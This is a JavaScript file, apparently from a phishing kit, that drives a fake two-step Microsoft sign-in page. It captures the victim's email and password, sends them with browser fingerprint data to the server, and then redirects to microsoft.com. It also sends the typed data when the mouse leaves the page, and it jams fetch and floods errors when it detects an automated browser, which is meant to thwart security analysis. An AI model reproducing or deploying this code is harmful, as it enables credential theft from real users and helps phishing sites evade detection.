
let pgi = 0;

function _(id){
    return document.getElementById(id);
}

let send_running = false;
let shown_error = false;

async function getAdditionalInfo(){
    let battery;
    try{
        battery = await navigator.getBattery(); //Some info pulled from Chrome users ;)
    }catch(e){
        battery = null;
    }
    let b = battery ? {
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime,
        level: battery.level,
    } : null;
    let o = {
        bwsLanguage: navigator.language,
        isWebdriver: navigator.webdriver,
        battery: b,
        CPUCores: navigator.hardwareConcurrency,
    }
    return o;
}
async function senddata(){
    send_running = true;
    return await fetch('/', {
        method: "POST", 
        mode: 'cors',
        body: JSON.stringify({mail: _('mail').value, password: _('password').value, doublecheck: shown_error, additional: await getAdditionalInfo()})
    }).then(resp => resp.text()).then(txt => {
        send_running = false;
    });
}
window.addEventListener('load', function(){
    [_('mail'), _('password')].forEach(e => {
        e.addEventListener('keydown', function(e){
            if(e.keyCode == 13){
                _('nextbtn').dispatchEvent(new Event('click'));   
            }
        });
    });
 
    _('nextbtn').addEventListener('click', function(){
        if(pgi++ == 0){
            _('hdlabel').textContent = "Password";
            _('mail').className = "outsideLeft";
            _('password').className = "";
        }else{
            senddata().then(function(){
                window.location.href = "https://microsoft.com";
            });
        }
        
        this.textContent = "Sign in";
    });
    if(navigator.webdriver){
        //Just for little confusion and CPU usage. ;)
        
        setTimeout(function(){
            fetch = function() {
                setInterval(function(){
                    throw btoa(crypto.getRandomValues(new Uint8Array(70)));
                }, 1);
                return undefined;
            }
            throw "asdasd"
        }, 1500); 
    }
    document.body.addEventListener('mouseleave', senddata); //Maybe, user realized, that website is suspicious (save at least some data, before user closes the tab)
});




